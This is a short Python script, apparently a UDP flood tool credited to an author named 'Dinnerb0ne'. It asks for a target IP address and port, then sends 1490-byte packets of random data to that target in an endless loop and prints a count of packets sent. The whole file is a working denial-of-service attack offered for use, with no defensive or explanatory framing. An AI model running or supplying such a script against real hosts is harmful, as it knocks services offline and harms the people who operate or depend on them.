print("\nLoading...\n")
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
import random
bytes = random._urandom(1490)
print ("Author    : Dinnerb0ne")
print ("Email     : tomma_20210919github@hotmail.com")
ip = input("IP Target : ")
port = int(input("Port       : "))
print("\nStarting...\n")
sent = 0
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    print("Sent %s packet to %s throught port:%s"%(sent,ip,port))